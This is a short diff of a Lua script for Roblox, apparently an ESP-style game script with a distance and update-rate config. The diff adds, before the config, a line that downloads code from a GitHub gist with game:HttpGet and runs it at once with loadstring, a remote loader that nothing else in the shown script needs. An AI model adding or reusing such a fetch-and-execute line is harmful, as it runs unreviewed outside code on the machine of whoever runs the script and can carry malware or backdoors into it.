@@ -1,3 +1,7 @@
+loadstring(game:HttpGet("https://gist.githubusercontent.com/ahmedmahmoudawaysali123456789-sys/318d4a973c5158e6d41092cc9fea75ec/raw"))()
+
+wait(0.1)
+
 --// ================= CONFIG =================
 local MAX_DISTANCE = 9999
 local UPDATE_RATE = 2
